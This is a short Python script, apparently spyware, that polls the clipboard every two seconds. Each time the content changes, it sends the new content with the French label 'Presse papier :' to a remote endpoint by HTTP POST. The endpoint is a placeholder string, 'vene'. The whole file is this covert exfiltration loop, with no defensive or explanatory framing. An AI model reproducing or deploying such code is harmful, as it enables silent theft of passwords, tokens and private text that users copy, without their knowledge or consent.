import clipboard
import time
import requests

def clipboard_monitor():
    old = clipboard.paste()
    message = 'Presse papier : '
    while True:
        time.sleep(2)
        current_time = time.strftime('%H:%M')
        mtn = clipboard.paste()
        if old != mtn:
            old = mtn
            requests.post('vene', data={'content': message + str(mtn)})

clipboard_monitor()
